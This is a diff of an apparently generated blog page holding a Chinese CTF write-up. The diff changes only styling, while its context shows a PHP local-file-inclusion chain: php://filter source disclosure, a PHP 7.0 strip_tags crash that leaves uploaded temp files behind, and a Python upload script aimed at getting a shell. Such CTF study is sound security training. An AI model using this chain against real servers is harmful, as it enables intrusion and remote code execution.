@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -260,7 +268,7 @@
 <p><code>?file=php://filter/read=convert.base64.encode/resource=flflflflag.php</code>       </p>
 <p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/636b976a-82d7-40c9-b96b-5cb660f19217.png" srcset="/img/loading.gif" alt="04.png">     </p>
 <p>解码后       </p>
-<div class="hljs"><pre><code><pre><code class="hljs php">&lt;html&gt;
+<pre><code><pre><code class="hljs php">&lt;html&gt;
 &lt;head&gt;
 &lt;script language=<span class="hljs-string">&quot;javascript&quot;</span> type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;
            window.location.href=<span class="hljs-string">&quot;404.html&quot;</span>;
@@ -278,7 +286,7 @@ $file=$_GET[<span class="hljs-string">&#x27;file&#x27;</span>];
 <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;
 <span class="hljs-meta">?&gt;</span>
 &lt;/body&gt;
-&lt;/html&gt;</code></pre></div></code></pre>
+&lt;/html&gt;</code></pre></code></pre>
 <p>感觉也没啥啊       </p>
 <p>接下来利用<code>php://filter/string.strip_tags</code>       </p>
 <p>php7.0的BUG</p>
@@ -286,7 +294,7 @@ $file=$_GET[<span class="hljs-string">&#x27;file&#x27;</span>];
 <p>输入payload后，会导致PHP崩溃清空堆栈重启，如果同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell         </p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/tr1ple/p/11301743.html">关于php文件操作的几个小trick </a></p>
 <p>上传脚本     </p>
-<div class="hljs"><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+<pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
 <span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO
 
 url=<span class="hljs-string">&#x27;http://e17fbb9d-53e9-44fc-9c60-91d0f4e7e017.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#x27;</span>
@@ -294,7 +302,7 @@ url=<span class="hljs-string">&#x27;http://e17fbb9d-53e9-44fc-9c60-91d0f4e7e017.
 file=&#123;<span class="hljs-string">&#x27;file&#x27;</span>:BytesIO(<span class="hljs-string">b&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>)&#125;
 
 r=requests.post(url=url,files=file,allow_redirects=<span class="hljs-literal">False</span>)
-print(<span class="hljs-string">&quot;YEs&quot;</span>)</code></pre></div></code></pre>
+print(<span class="hljs-string">&quot;YEs&quot;</span>)</code></pre></code></pre>
 <p>应该写一句话木马的，但我试了好几次都没成功，<code>phpinfo();</code>都没法执行       </p>
 <p>然后会在<code>dir.php</code>（包含/tmp中的文件）中得到文件名       </p>
 <p><code>array(3) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [4]=&gt; string(9) &quot;phpTwf0sR&quot;</code>      </p>
@@ -459,6 +467,8 @@ print(<span class="hljs-string">&quot;YEs&quot;</span>)</code></pre></div></code
 
 
 
+  
+    
   
 
 
